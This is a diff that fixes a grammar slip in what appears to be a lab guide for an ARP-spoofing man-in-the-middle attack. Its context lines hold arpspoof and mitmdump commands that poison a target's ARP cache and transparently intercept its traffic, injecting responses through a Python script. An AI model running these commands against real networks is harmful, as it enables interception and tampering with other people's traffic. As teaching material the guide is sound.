@@ -22,7 +22,7 @@ $ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
 
 3. Start the interception command.
 $ sudo mitmdump -s simplereponse.py --mode transparent --listen-host <kali ip> --anticache
->>> kali intercepts lets and execute the python prog as a response.
+>>> kali intercepts lets and executes the python prog as a response.
 
 BONUS: see invert.py and hackedcroft.py in the resources directory.
 
@@ -88,7 +88,7 @@ Click on the IP and go to Commands.
 >@
 >@3. Start the interception command.
 >@$ sudo mitmdump -s simplereponse.py --mode transparent --listen-host <kali ip> --anticache
->@>>> kali intercepts and execute the python prog as a response.
+>@>>> kali intercepts and executes the python prog as a response.
 >@
 >@BONUS: see invert.py and hackedcroft.py in the resources directory.
 >@
